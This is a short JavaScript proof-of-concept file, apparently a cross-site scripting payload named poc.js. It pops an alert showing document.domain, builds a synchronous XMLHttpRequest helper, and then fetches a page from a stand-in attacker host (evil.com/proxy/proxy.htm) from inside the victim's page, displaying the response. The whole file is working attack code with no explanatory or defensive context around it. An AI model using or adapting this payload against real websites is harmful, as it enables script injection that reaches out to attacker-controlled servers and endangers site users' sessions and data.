alert(document.domain+" | poc.js");
xhr = getTransport();

function req(method,src,argv){
  xhr.open(method,src,false);
  if(method=="POST")xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
  xhr.send(argv);
  return xhr.responseText;
}

x = req("GET","http://evil.com/proxy/proxy.htm");
alert(x);
